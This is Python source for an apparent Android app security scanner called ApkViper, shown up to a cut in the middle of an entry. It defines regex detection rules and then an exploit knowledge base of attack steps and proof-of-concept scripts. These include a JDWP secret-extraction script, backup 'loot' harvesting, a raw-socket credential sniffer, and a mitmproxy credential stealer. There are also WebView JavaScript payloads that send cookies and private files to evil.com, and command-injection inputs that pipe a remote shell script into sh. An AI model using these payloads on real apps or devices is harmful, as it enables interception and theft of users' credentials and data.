#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ApkViper v2.0.0 - Advanced Android Security Assessment Platform
================================================================
Fully standalone. Pure Python. No external dependencies.
Works on Windows, Linux, macOS. Single file.

  python apkviper.py                          Launch GUI
  python apkviper.py --scan app.apk           Headless scan
  python apkviper.py --scan app.apk --format html --output report.html
  python apkviper.py --server --port 8089     REST API
  python apkviper.py --help
"""

import os, sys, re, json, csv, struct, time, hashlib, argparse, threading, math
import zipfile, io, webbrowser, tempfile, socket, traceback
from pathlib import Path
from datetime import datetime, timezone
from collections import OrderedDict
from http.server import HTTPServer, BaseHTTPRequestHandler

APP_NAME = "ApkViper"
VERSION  = "2.0.0"
AUTHOR   = "darkfox"
SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SESSION_DIR = os.path.join(str(Path.home()), ".apkviper")

# ============================================================
#  50 SECURITY RULES
# ============================================================
RULES = [
    {"id":"DA-MAN-001","name":"Debuggable Application","sev":"CRITICAL","cwe":"CWE-489","owasp":"M9","regex":r'android:debuggable\s*=\s*"true"',"types":["MANIFEST"],"desc":"App is debuggable in production.","fix":"Set android:debuggable=\"false\".","cvss":9.8},
    {"id":"DA-MAN-002","name":"Backup Enabled","sev":"HIGH","cwe":"CWE-530","owasp":"M2","regex":r'android:allowBackup\s*=\s*"true"',"types":["MANIFEST"],"desc":"App data can be backed up via adb.","fix":"Set android:allowBackup=\"false\".","cvss":7.5},
    {"id":"DA-MAN-003","name":"Cleartext Traffic","sev":"HIGH","cwe":"CWE-319","owasp":"M3","regex":r'android:usesCleartextTraffic\s*=\s*"true"',"types":["MANIFEST"],"desc":"HTTP allowed, MITM possible.","fix":"Set usesCleartextTraffic=\"false\".","cvss":7.4},
    {"id":"DA-MAN-004","name":"Exported Component","sev":"HIGH","cwe":"CWE-926","owasp":"M1","regex":r'android:exported\s*=\s*"true"',"types":["MANIFEST"],"desc":"Component accessible to other apps.","fix":"Set exported=\"false\" or add permissions.","cvss":7.5},
    {"id":"DA-CRY-001","name":"Weak Hash (MD5/SHA1)","sev":"MEDIUM","cwe":"CWE-328","owasp":"M5","regex":r'(?i)MessageDigest\.getInstance\s*\(\s*"(MD5|SHA-?1)"\s*\)',"types":["SOURCE"],"desc":"MD5/SHA1 are broken.","fix":"Use SHA-256 or SHA-3.","cvss":5.3},
    {"id":"DA-CRY-002","name":"Weak Crypto (DES/RC4/ECB)","sev":"HIGH","cwe":"CWE-327","owasp":"M5","regex":r'(?i)Cipher\.getInstance\s*\(\s*"(DES|RC4|.*ECB.*)"',"types":["SOURCE"],"desc":"Insecure cipher.","fix":"Use AES/GCM/NoPadding.","cvss":7.5},
    {"id":"DA-CRY-003","name":"Insecure Random","sev":"MEDIUM","cwe":"CWE-330","owasp":"M5","regex":r'new\s+java\.util\.Random\s*\(|new\s+Random\s*\(',"types":["SOURCE"],"desc":"Predictable RNG.","fix":"Use SecureRandom.","cvss":5.3},
    {"id":"DA-CRY-004","name":"Hardcoded Crypto Key","sev":"CRITICAL","cwe":"CWE-321","owasp":"M5","regex":r'(?i)SecretKeySpec\s*\(\s*"[^"]{8,}"',"types":["SOURCE"],"desc":"Hardcoded encryption key.","fix":"Use Android Keystore.","cvss":9.1},
    {"id":"DA-SEC-001","name":"Hardcoded Secret/API Key","sev":"CRITICAL","cwe":"CWE-798","owasp":"M9","regex":r'(?i)(api[_-]?key|secret[_-]?key|password|token|auth|credentials|private[_-]?key|aws[_-]?access|firebase)\s*[=:]\s*"[A-Za-z0-9+/=_\-]{8,}"',"types":["SOURCE","RESOURCE"],"desc":"Secrets extractable via decompilation.","fix":"Fetch from secure backend.","cvss":9.8},
    {"id":"DA-SEC-002","name":"Sensitive Data in Logs","sev":"HIGH","cwe":"CWE-532","owasp":"M2","regex":r'(?i)Log\.(d|v|i|w|e)\s*\([^)]*?(password|token|secret|key|auth|credit|ssn)',"types":["SOURCE"],"desc":"Sensitive data logged.","fix":"Remove from logs.","cvss":7.5},
    {"id":"DA-SEC-003","name":"Clipboard Leak","sev":"MEDIUM","cwe":"CWE-200","owasp":"M2","regex":r'ClipboardManager|clipData|setPrimaryClip',"types":["SOURCE"],"desc":"Clipboard data accessible.","fix":"Avoid clipboard for secrets.","cvss":5.3},
    {"id":"DA-SEC-004","name":"Insecure SharedPreferences","sev":"HIGH","cwe":"CWE-922","owasp":"M2","regex":r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE',"types":["SOURCE"],"desc":"World-readable prefs.","fix":"Use MODE_PRIVATE.","cvss":7.5},
    {"id":"DA-SEC-005","name":"World-Readable Files","sev":"HIGH","cwe":"CWE-276","owasp":"M2","regex":r'(?i)(openFileOutput|FileOutputStream)\s*\([^)]*MODE_WORLD',"types":["SOURCE"],"desc":"Files accessible to all apps.","fix":"Use MODE_PRIVATE.","cvss":7.5},
    {"id":"DA-NET-001","name":"Trust All Certificates","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(TrustAllCerts|AllowAllHostnameVerifier|ALLOW_ALL_HOSTNAME_VERIFIER|X509TrustManager.*checkServerTrusted\s*\([^)]*\)\s*\{\s*\})',"types":["SOURCE"],"desc":"SSL validation disabled.","fix":"Use proper TrustManager.","cvss":9.8},
    {"id":"DA-NET-002","name":"Weak Network Config","sev":"HIGH","cwe":"CWE-295","owasp":"M3","regex":r'cleartextTrafficPermitted\s*=\s*"true"',"types":["RESOURCE"],"desc":"Cleartext allowed in NSC.","fix":"Set to false.","cvss":7.4},
    {"id":"DA-NET-003","name":"Insecure WebView","sev":"HIGH","cwe":"CWE-749","owasp":"M1","regex":r'(?i)(setJavaScriptEnabled\s*\(\s*true|setAllowFileAccess\s*\(\s*true|setMixedContentMode)',"types":["SOURCE"],"desc":"WebView dangerous settings.","fix":"Disable JS/file access.","cvss":7.5},
    {"id":"DA-NET-004","name":"SSL Error Override","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'onReceivedSslError.*proceed\s*\(',"types":["SOURCE"],"desc":"SSL errors ignored.","fix":"Don't override SSL handler.","cvss":9.8},
    {"id":"DA-NET-005","name":"Certificate Bypass","sev":"CRITICAL","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(setHostnameVerifier\s*\(\s*SSLSocketFactory\.ALLOW_ALL|verify\s*\([^)]*\)\s*\{\s*return\s+true)',"types":["SOURCE"],"desc":"Hostname verification bypassed.","fix":"Use default verifier.","cvss":9.8},
    {"id":"DA-PLT-001","name":"Zip Path Traversal","sev":"HIGH","cwe":"CWE-22","owasp":"M1","regex":r'(?i)ZipEntry.*getName\(\)(?!.*canonical)',"types":["SOURCE"],"desc":"Zip Slip vulnerability.","fix":"Validate extracted paths.","cvss":8.1},
    {"id":"DA-PLT-002","name":"Mutable PendingIntent","sev":"HIGH","cwe":"CWE-927","owasp":"M1","regex":r'PendingIntent\.(getActivity|getBroadcast|getService)\s*\([^)]*,\s*0\s*\)',"types":["SOURCE"],"desc":"PendingIntent hijackable.","fix":"Use FLAG_IMMUTABLE.","cvss":7.5},
    {"id":"DA-PLT-003","name":"Content Provider Injection","sev":"HIGH","cwe":"CWE-89","owasp":"M1","regex":r'(?i)(rawQuery|execSQL)\s*\([^)]*\+\s*(request|uri|input|param)',"types":["SOURCE"],"desc":"SQL injection via provider.","fix":"Use parameterized queries.","cvss":8.6},
    {"id":"DA-PLT-004","name":"Broadcast Theft","sev":"MEDIUM","cwe":"CWE-927","owasp":"M1","regex":r'sendBroadcast\s*\(\s*new\s+Intent\s*\(',"types":["SOURCE"],"desc":"Implicit broadcast leaks.","fix":"Use LocalBroadcastManager.","cvss":5.3},
    {"id":"DA-PLT-005","name":"Deeplink Hijack","sev":"MEDIUM","cwe":"CWE-939","owasp":"M1","regex":r'<data\s+android:scheme\s*=\s*"(http|https|[a-z]+)"',"types":["MANIFEST"],"desc":"Unvalidated deeplinks.","fix":"Validate parameters.","cvss":6.1},
    {"id":"DA-INJ-001","name":"SQL Injection","sev":"CRITICAL","cwe":"CWE-89","owasp":"M7","regex":r'(?i)(rawQuery|execSQL)\s*\(\s*"[^"]*"\s*\+',"types":["SOURCE"],"desc":"SQL injection via concat.","fix":"Use parameterized queries.","cvss":9.8},
    {"id":"DA-INJ-002","name":"Command Injection","sev":"CRITICAL","cwe":"CWE-78","owasp":"M7","regex":r'Runtime\.getRuntime\(\)\.exec\s*\([^)]*\+',"types":["SOURCE"],"desc":"OS command injection.","fix":"Avoid shell commands.","cvss":9.8},
    {"id":"DA-INJ-003","name":"Tapjacking","sev":"MEDIUM","cwe":"CWE-1021","owasp":"M1","regex":r'(?i)setOnClickListener|OnTouchListener',"types":["SOURCE"],"desc":"Overlay attack possible.","fix":"Set filterTouchesWhenObscured.","cvss":4.3},
    {"id":"DA-RES-001","name":"Root Detection","sev":"INFO","cwe":"CWE-919","owasp":"M8","regex":r'(?i)(su\b|/system/xbin/su|Superuser|com\.topjohnwu\.magisk|isRooted)',"types":["SOURCE"],"desc":"Root detection found.","fix":"Use SafetyNet/Play Integrity.","cvss":3.7},
    {"id":"DA-RES-002","name":"Emulator Detection","sev":"INFO","cwe":"CWE-919","owasp":"M8","regex":r'(?i)(Build\.(FINGERPRINT|MODEL).*generic|goldfish|ranchu|isEmulator)',"types":["SOURCE"],"desc":"Emulator detection found.","fix":"Combine with attestation.","cvss":3.7},
    {"id":"DA-RES-003","name":"Dynamic Code Loading","sev":"HIGH","cwe":"CWE-94","owasp":"M7","regex":r'(?i)(DexClassLoader|PathClassLoader|loadDex|dalvik\.system)',"types":["SOURCE"],"desc":"Runtime code loading.","fix":"Verify loaded code integrity.","cvss":8.1},
    {"id":"DA-RES-004","name":"Unsafe Deserialization","sev":"HIGH","cwe":"CWE-502","owasp":"M7","regex":r'(?i)(ObjectInputStream|readObject\s*\()',"types":["SOURCE"],"desc":"Deserialization risk.","fix":"Validate objects.","cvss":8.1},
    {"id":"DA-PRV-001","name":"Dangerous Permissions","sev":"MEDIUM","cwe":"CWE-250","owasp":"M1","regex":r'(?i)android\.permission\.(READ_CONTACTS|READ_SMS|CAMERA|RECORD_AUDIO|ACCESS_FINE_LOCATION|READ_PHONE_STATE|SEND_SMS)',"types":["MANIFEST"],"desc":"Dangerous permissions requested.","fix":"Minimize permissions.","cvss":5.3},
    {"id":"DA-PRV-002","name":"Tracker SDK","sev":"MEDIUM","cwe":"CWE-359","owasp":"M2","regex":r'(?i)(com\.facebook\..*sdk|com\.google\.firebase\.analytics|com\.appsflyer|com\.adjust\.sdk|com\.mixpanel|com\.amplitude|io\.branch)',"types":["SOURCE","MANIFEST"],"desc":"Tracking SDK detected.","fix":"Disclose in privacy policy.","cvss":4.3},
    {"id":"DA-PRV-003","name":"Hardcoded URL/IP","sev":"LOW","cwe":"CWE-200","owasp":"M9","regex":r'https?://[a-zA-Z0-9._/\-:]+',"types":["SOURCE"],"desc":"URLs reveal infrastructure.","fix":"Use config files.","cvss":3.7},
    {"id":"DA-CLD-001","name":"Firebase Misconfiguration","sev":"HIGH","cwe":"CWE-284","owasp":"M1","regex":r'(?i)(firebaseio\.com|firebase\.googleapis\.com)',"types":["SOURCE","RESOURCE"],"desc":"Firebase endpoints exposed.","fix":"Secure Firebase rules.","cvss":7.5},
    {"id":"DA-AUT-001","name":"Insecure Auth Storage","sev":"HIGH","cwe":"CWE-522","owasp":"M4","regex":r'(?i)(getSharedPreferences|SharedPreferences).*?(password|token|session|auth)',"types":["SOURCE"],"desc":"Credentials in SharedPrefs.","fix":"Use Android Keystore.","cvss":7.5},
    {"id":"DA-AUT-002","name":"Insecure Session","sev":"HIGH","cwe":"CWE-384","owasp":"M6","regex":r'(?i)(JSESSIONID|session_id|sessionToken)\s*=\s*"',"types":["SOURCE"],"desc":"Hardcoded session.","fix":"Generate server-side.","cvss":7.5},
    {"id":"DA-WEB-001","name":"WebView XSS","sev":"HIGH","cwe":"CWE-79","owasp":"M7","regex":r'addJavascriptInterface\s*\(',"types":["SOURCE"],"desc":"JS interface exposed.","fix":"Validate input.","cvss":8.1},
    {"id":"DA-WEB-002","name":"XXE Injection","sev":"HIGH","cwe":"CWE-611","owasp":"M7","regex":r'(?i)(XMLInputFactory|SAXParser|DocumentBuilder)(?!.*disallow)',"types":["SOURCE"],"desc":"XXE possible.","fix":"Disable external entities.","cvss":7.5},
    {"id":"DA-WEB-003","name":"SSRF","sev":"HIGH","cwe":"CWE-918","owasp":"M7","regex":r'(?i)(URL\s*\(\s*[^"]*\+|openConnection\s*\(\s*\).*user)',"types":["SOURCE"],"desc":"SSRF risk.","fix":"Validate URLs.","cvss":7.5},
    {"id":"DA-OTH-001","name":"Debug Code in Production","sev":"MEDIUM","cwe":"CWE-489","owasp":"M10","regex":r'(?i)(TODO|FIXME|HACK|DEBUG|test.*password|backdoor)',"types":["SOURCE"],"desc":"Debug artifacts found.","fix":"Remove before release.","cvss":5.3},
    {"id":"DA-OTH-002","name":"Malware Pattern","sev":"CRITICAL","cwe":"CWE-506","owasp":"M10","regex":r'(?i)(SmsManager\.send|DeviceAdminReceiver|AccessibilityService.*performAction)',"types":["SOURCE"],"desc":"Suspicious behavior.","fix":"Review functionality.","cvss":9.8},
    {"id":"DA-OTH-003","name":"Native Library","sev":"MEDIUM","cwe":"CWE-676","owasp":"M7","regex":r'(?i)(System\.loadLibrary|System\.load\s*\()',"types":["SOURCE"],"desc":"Native code loaded.","fix":"Audit native libs.","cvss":5.3},
    {"id":"DA-NET-006","name":"SSL Pinning","sev":"MEDIUM","cwe":"CWE-295","owasp":"M3","regex":r'(?i)(CertificatePinner|network_security_config|ssl.*pin)',"types":["SOURCE","RESOURCE"],"desc":"SSL pinning implementation.","fix":"Use multiple techniques.","cvss":5.3},
    {"id":"DA-SEC-006","name":"Sensitive File","sev":"MEDIUM","cwe":"CWE-312","owasp":"M2","regex":r'(?i)\.(p12|pfx|pem|key|cer|bks|jks|keystore|db|sqlite)',"types":["SOURCE","RESOURCE"],"desc":"Sensitive file in APK.","fix":"Don't ship secrets.","cvss":6.5},
    {"id":"DA-AUT-003","name":"Weak Password Policy","sev":"MEDIUM","cwe":"CWE-521","owasp":"M4","regex":r'(?i)(password.*\.length\s*[<>]=?\s*[1-5][^0-9])',"types":["SOURCE"],"desc":"Weak password requirement.","fix":"Min 8 chars + complexity.","cvss":5.3},
    {"id":"DA-PLT-006","name":"Fragment Injection","sev":"HIGH","cwe":"CWE-470","owasp":"M1","regex":r'(?i)(PreferenceActivity|isValidFragment\s*\([^)]*\)\s*\{\s*return\s+true)',"types":["SOURCE"],"desc":"Fragment injection risk.","fix":"Override isValidFragment.","cvss":7.5},
    {"id":"DA-WEB-004","name":"Open Redirect","sev":"MEDIUM","cwe":"CWE-601","owasp":"M7","regex":r'(?i)(redirect|location)\s*[=:]\s*[^"]*\+\s*(request|intent|getParameter)',"types":["SOURCE"],"desc":"Unvalidated redirect.","fix":"Whitelist targets.","cvss":6.1},
    {"id":"DA-RES-005","name":"Missing Obfuscation","sev":"MEDIUM","cwe":"CWE-656","owasp":"M9","regex":r'(?i)(BuildConfig\.DEBUG|proguard-rules)',"types":["SOURCE"],"desc":"Code not obfuscated.","fix":"Enable R8/ProGuard.","cvss":4.3},
    {"id":"DA-PRV-004","name":"GDPR Consent","sev":"MEDIUM","cwe":"CWE-359","owasp":"M2","regex":r'(?i)(ConsentInformation|GDPR|privacy.*consent)',"types":["SOURCE"],"desc":"GDPR consent referenced.","fix":"Implement consent flow.","cvss":4.3},
    {"id":"DA-RES-006","name":"Weak Biometric","sev":"MEDIUM","cwe":"CWE-287","owasp":"M4","regex":r'(?i)(BiometricPrompt|FingerprintManager)(?!.*CryptoObject)',"types":["SOURCE"],"desc":"Biometric without CryptoObject.","fix":"Use CryptoObject.","cvss":6.5},
]

# ============================================================
#  EXPLOIT KNOWLEDGE BASE  (real-world techniques per finding)
# ============================================================
EXPLOITS = [
    {"vuln":"Debuggable Application","tool":"adb, jdb, JADX, Frida",
     "steps":"1. Confirm debuggable:\n   aapt dump badging target.apk | grep -i debuggable\n2. Install and get PID:\n   adb install target.apk\n   adb shell ps | grep <package>\n3. Forward JDWP port:\n   adb forward tcp:8700 jdwp:<PID>\n4. Attach debugger:\n   jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n5. Dump memory / call methods at runtime:\n   jdb> threads\n   jdb> classes\n   jdb> methods <classname>\n   jdb> eval com.app.SecretManager.getApiKey()\n6. Use Android Studio: Run > Attach Debugger to Android Process\n   Set breakpoints on sensitive methods, inspect variables live",
     "poc":"#!/bin/bash\n# Full debuggable exploit: extract runtime secrets\nPKG=$(aapt dump badging target.apk | grep package | awk -F\"'\" '{print $2}')\nadb install -r target.apk\nsleep 2\nPID=$(adb shell pidof $PKG)\nadb forward tcp:8700 jdwp:$PID\necho \"[*] JDWP attached on PID $PID\"\necho \"[*] Connect: jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\"\necho \"[*] Then run: eval com.app.Config.SECRET_KEY\""},
    {"vuln":"Backup Enabled","tool":"adb, ABE (Android Backup Extractor)",
     "steps":"1. Trigger backup (no root needed):\n   adb backup -f backup.ab -apk -shared <package>\n2. User confirms on device (tap 'Back up my data')\n3. Extract with ABE:\n   java -jar abe.jar unpack backup.ab backup.tar\n   tar xvf backup.tar\n4. Harvest sensitive data:\n   find apps/<package> -name '*.db' -o -name '*.xml' -o -name '*.json'\n   sqlite3 apps/<package>/db/credentials.db 'SELECT * FROM users;'\n5. Read SharedPreferences:\n   cat apps/<package>/sp/*.xml | grep -i token\\|password\\|session\n6. Modify and restore:\n   tar cvf modified.tar apps/\n   java -jar abe.jar pack modified.tar modified.ab\n   adb restore modified.ab",
     "poc":"#!/bin/bash\n# Automated backup data extraction\nPKG=$1\nif [ -z \"$PKG\" ]; then echo \"Usage: $0 <package.name>\"; exit 1; fi\nadb backup -f /tmp/backup.ab -apk $PKG\necho \"[!] Confirm backup on device NOW\"\nsleep 10\njava -jar abe.jar unpack /tmp/backup.ab /tmp/backup.tar\nmkdir -p /tmp/loot && cd /tmp/loot\ntar xf /tmp/backup.tar\necho \"\\n[+] SharedPreferences:\"\nfind . -name '*.xml' -path '*/sp/*' -exec grep -l 'password\\|token\\|secret\\|key' {} \\;\necho \"\\n[+] Databases:\"\nfind . -name '*.db' -exec sh -c 'echo \"--- {} ---\"; sqlite3 {} \".tables\"' \\;"},
    {"vuln":"Cleartext Traffic","tool":"mitmproxy, tcpdump, Wireshark",
     "steps":"1. Setup transparent proxy:\n   mitmproxy --mode transparent --listen-port 8080\n2. Route device through proxy:\n   adb shell settings put global http_proxy <attacker_ip>:8080\n3. Or use tcpdump on device (root):\n   adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap\n   adb pull /sdcard/capture.pcap\n4. Analyze in Wireshark:\n   Filter: http || tcp.port == 80\n   Look for credentials, tokens, PII in plaintext\n5. Active MITM with arpspoof:\n   arpspoof -i wlan0 -t <device_ip> <gateway_ip>\n   mitmproxy --mode transparent -p 8080",
     "poc":"#!/usr/bin/env python3\n# Passive cleartext traffic sniffer\nimport socket, re\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\nsock.bind(('0.0.0.0', 0))\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\nprint('[*] Sniffing cleartext HTTP traffic...')\nwhile True:\n    data = sock.recvfrom(65565)[0]\n    payload = data[40:].decode('utf-8', errors='ignore')\n    for pattern in ['password=', 'token=', 'session=', 'Authorization:']:\n        if pattern.lower() in payload.lower():\n            print(f'[!] CAPTURED: {payload[:200]}')"},
    {"vuln":"Exported Component","tool":"adb, drozer, Frida",
     "steps":"1. Enumerate with drozer:\n   dz> run app.activity.info -a <package> -u\n   dz> run app.service.info -a <package> -u\n   dz> run app.broadcast.info -a <package> -u\n   dz> run app.provider.info -a <package> -u\n2. Launch unexported-looking activities:\n   adb shell am start -n <package>/.admin.DashboardActivity\n   adb shell am start -n <package>/.internal.DebugActivity\n3. Send crafted broadcasts:\n   adb shell am broadcast -a <package>.RESET_PASSWORD --es email attacker@evil.com\n4. Query content providers:\n   adb shell content query --uri content://<package>.provider/users\n   adb shell content query --uri content://<package>.provider/users --where \"1=1\"\n5. Start services:\n   adb shell am startservice -n <package>/.sync.DataExportService --es dest http://evil.com",
     "poc":"#!/bin/bash\n# Automated exported component fuzzer\nPKG=$1\necho \"[*] Scanning exported components for $PKG\"\nfor activity in $(adb shell dumpsys package $PKG | grep -A1 'exported=true' | grep -oP '[\\w.]+Activity'); do\n    echo \"[+] Launching: $activity\"\n    adb shell am start -n $PKG/$activity 2>/dev/null\n    sleep 1\ndone\nfor provider in $(adb shell dumpsys package $PKG | grep -oP 'content://[\\w./]+'); do\n    echo \"[+] Querying: $provider\"\n    adb shell content query --uri $provider 2>/dev/null | head -5\ndone"},
    {"vuln":"Hardcoded Secret","tool":"JADX, apktool, trufflehog, nuclei",
     "steps":"1. Decompile:\n   jadx -d output/ target.apk\n2. Search for secrets:\n   grep -rn 'api_key\\|API_KEY\\|secret_key\\|aws_access\\|AIza\\|ghp_\\|sk-' output/\n3. Check BuildConfig:\n   cat output/resources/classes/BuildConfig.java\n4. Scan strings.xml:\n   grep -i 'key\\|secret\\|token\\|password' output/resources/res/values/strings.xml\n5. Base64 decode suspicious strings:\n   echo '<base64_string>' | base64 -d\n6. Test extracted keys:\n   # Firebase: curl https://<project>.firebaseio.com/.json\n   # Google Maps: curl 'https://maps.googleapis.com/maps/api/geocode/json?key=<KEY>&address=test'\n   # AWS: aws sts get-caller-identity --access-key <KEY> --secret-key <SECRET>\n7. Use trufflehog:\n   trufflehog filesystem output/ --json",
     "poc":"#!/usr/bin/env python3\n# Extract and validate hardcoded secrets from decompiled APK\nimport re, os, json, urllib.request\nSECRET_PATTERNS = [\n    (r'AIza[0-9A-Za-z_-]{35}', 'Google API Key'),\n    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),\n    (r'ghp_[0-9a-zA-Z]{36}', 'GitHub Token'),\n    (r'sk-[0-9a-zA-Z]{32,}', 'OpenAI/Stripe Key'),\n    (r'firebase[\\w-]+\\.firebaseio\\.com', 'Firebase DB'),\n    (r'-----BEGIN (RSA |EC )?PRIVATE KEY-----', 'Private Key'),\n]\nfor root, dirs, files in os.walk('output'):\n    for fname in files:\n        if fname.endswith(('.java','.xml','.json','.properties')):\n            path = os.path.join(root, fname)\n            content = open(path, 'r', errors='ignore').read()\n            for pattern, label in SECRET_PATTERNS:\n                for m in re.finditer(pattern, content):\n                    print(f'[CRITICAL] {label}: {m.group()[:60]}... in {path}')"},
    {"vuln":"Sensitive Data in Logs","tool":"adb logcat, Frida",
     "steps":"1. Monitor logs in real-time:\n   adb logcat | grep -iE 'password|token|secret|session|credit|ssn|auth'\n2. Filter by app:\n   adb logcat --pid=$(adb shell pidof <package>) | grep -iE 'password|bearer|jwt'\n3. Hook Log class with Frida:\n   frida -U -f <package> -l log_hook.js\n4. Check for sensitive data patterns:\n   adb logcat -d | grep -oP '(Bearer |token=|password=|session_id=)[^\\s]+'\n5. Dump full log history:\n   adb logcat -d > full_log.txt\n   grep -c 'password\\|token\\|secret' full_log.txt",
     "poc":"// Frida script: log_hook.js — intercept all Log calls\nJava.perform(function() {\n    var Log = Java.use('android.util.Log');\n    var methods = ['d','v','i','w','e'];\n    var sensitive = /password|token|secret|bearer|session|credit|ssn|auth_key/i;\n    methods.forEach(function(m) {\n        Log[m].overload('java.lang.String','java.lang.String').implementation = function(tag, msg) {\n            if (sensitive.test(msg)) {\n                console.log('[!!! LEAK] ' + tag + ': ' + msg);\n                // Send to attacker server:\n                // var url = 'https://evil.com/log?data=' + encodeURIComponent(msg);\n            }\n            return this[m](tag, msg);\n        };\n    });\n    console.log('[*] Log hooks installed — monitoring sensitive data leaks');\n});"},
    {"vuln":"Trust All Certificates","tool":"mitmproxy, Burp Suite, Frida",
     "steps":"1. No certificate pinning = trivial MITM:\n   mitmproxy --mode regular -p 8080\n2. Install mitmproxy CA on device:\n   adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/\n   Settings > Security > Install from storage\n3. Set proxy on device:\n   adb shell settings put global http_proxy <ip>:8080\n4. ALL HTTPS traffic is now visible in mitmproxy/Burp\n5. Intercept auth tokens:\n   mitmproxy flow filters: ~q ~s \"authorization\"\n6. Modify responses to bypass server-side checks:\n   mitmdump -s modify_response.py\n7. Steal OAuth tokens, session cookies, API keys in transit",
     "poc":"#!/usr/bin/env python3\n# mitmproxy inline script: steal credentials in transit\nfrom mitmproxy import http\nimport json, re\n\nclass CredentialStealer:\n    def request(self, flow: http.HTTPFlow):\n        # Check request body for credentials\n        if flow.request.content:\n            body = flow.request.content.decode('utf-8', errors='ignore')\n            for pattern in ['password', 'token', 'secret', 'credential', 'auth']:\n                if pattern in body.lower():\n                    print(f'[!] CREDS in POST to {flow.request.pretty_url}')\n                    print(f'    Body: {body[:300]}')\n        # Check auth headers\n        for h in ['authorization', 'x-api-key', 'x-auth-token']:\n            if h in flow.request.headers:\n                print(f'[!] AUTH HEADER: {h}: {flow.request.headers[h]}')\n\naddons = [CredentialStealer()]"},
    {"vuln":"SSL Error Override","tool":"Frida, mitmproxy",
     "steps":"1. App calls handler.proceed() on SSL errors — full MITM:\n   mitmproxy -p 8080 --ssl-insecure\n2. Configure device proxy\n3. All HTTPS traffic decrypted even with invalid certs\n4. Frida hook to confirm:\n   Java.use('android.webkit.SslErrorHandler').proceed.implementation = function() {\n     console.log('[*] SSL error ignored by app — MITM possible');\n     this.proceed();\n   };",
     "poc":"// Frida: confirm and exploit SSL error override\nJava.perform(function() {\n    var SslErrorHandler = Java.use('android.webkit.SslErrorHandler');\n    SslErrorHandler.proceed.implementation = function() {\n        console.log('[CRITICAL] App ignores SSL errors — full MITM active');\n        console.log('[*] Stack: ' + Java.use('android.util.Log').getStackTraceString(\n            Java.use('java.lang.Exception').$new()));\n        this.proceed();\n    };\n    var WebViewClient = Java.use('android.webkit.WebViewClient');\n    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {\n        console.log('[CRITICAL] onReceivedSslError called, error: ' + error.toString());\n        handler.proceed(); // App auto-accepts\n    };\n});"},
    {"vuln":"Insecure WebView","tool":"adb, Frida, Chrome DevTools Protocol",
     "steps":"1. Enable WebView debugging:\n   chrome://inspect/#devices (if WebView.setWebContentsDebuggingEnabled(true))\n2. Hook via Frida to enable debug:\n   Java.use('android.webkit.WebView').setWebContentsDebuggingEnabled(true);\n3. Inject JavaScript through exported activity:\n   adb shell am start -n <pkg>/.WebViewActivity --es url \"javascript:fetch('https://evil.com/steal?c='+document.cookie)\"\n4. If addJavascriptInterface exists, call exposed Java methods:\n   jsinterface.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id')\n5. File theft via file:// scheme:\n   javascript:fetch('file:///data/data/<pkg>/shared_prefs/auth.xml').then(r=>r.text()).then(t=>fetch('https://evil.com/?d='+btoa(t)))",
     "poc":"// Frida: exploit WebView JS interface for RCE (CVE-2012-6636 pattern)\nJava.perform(function() {\n    var WebView = Java.use('android.webkit.WebView');\n    WebView.addJavascriptInterface.implementation = function(obj, name) {\n        console.log('[!] JS Interface added: ' + name + ' -> ' + obj.getClass().getName());\n        this.addJavascriptInterface(obj, name);\n    };\n    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {\n        console.log('[*] loadUrl: ' + url);\n        // Inject payload after page loads\n        var payload = \"javascript:void(document.location='https://evil.com/?cookies='+document.cookie)\";\n        this.loadUrl(url);\n        var self = this;\n        setTimeout(function(){ self.loadUrl(payload); }, 2000);\n    };\n});"},
    {"vuln":"SQL Injection","tool":"adb, drozer, Frida, sqlmap",
     "steps":"1. Find content providers:\n   drozer: run scanner.provider.finduris -a <package>\n   adb: dumpsys package <package> | grep 'provider'\n2. Test injection:\n   adb shell content query --uri content://<pkg>.provider/users --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\"\n3. Exfiltrate data:\n   adb shell content query --uri content://<pkg>.provider/users --where \"1=1) UNION SELECT username,password,email FROM users--\"\n4. drozer automated scan:\n   dz> run scanner.provider.injection -a <package>\n   dz> run app.provider.query content://<pkg>/users --projection \"* FROM sqlite_master--\"\n5. Frida SQLite monitor:\n   Hook rawQuery() to log all SQL queries and find injection points",
     "poc":"// Frida: real-time SQL injection detector + data exfiltrator\nJava.perform(function() {\n    var SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');\n    SQLiteDatabase.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function(sql, args) {\n        console.log('[SQL] ' + sql);\n        if (args !== null) {\n            for (var i = 0; i < args.length; i++) console.log('  [ARG' + i + '] ' + args[i]);\n        }\n        var cursor = this.rawQuery(sql, args);\n        // Dump first 5 rows\n        var cols = cursor.getColumnCount();\n        var count = 0;\n        while (cursor.moveToNext() && count < 5) {\n            var row = '';\n            for (var c = 0; c < cols; c++) row += cursor.getString(c) + ' | ';\n            console.log('  [ROW] ' + row);\n            count++;\n        }\n        cursor.moveToFirst();\n        return cursor;\n    };\n});"},
    {"vuln":"Command Injection","tool":"Frida, adb",
     "steps":"1. Find Runtime.exec() calls in decompiled source (JADX)\n2. Trace user input flow to exec() parameters\n3. Hook Runtime.exec with Frida to log all commands:\n   frida -U -f <package> -l cmd_hook.js\n4. Test injection payloads:\n   Input: ; id; whoami; cat /data/data/<pkg>/shared_prefs/*.xml\n   Input: $(curl https://evil.com/shell.sh | sh)\n   Input: `cat /etc/passwd`\n5. If ProcessBuilder used:\n   Hook ProcessBuilder.start() to intercept command arrays",
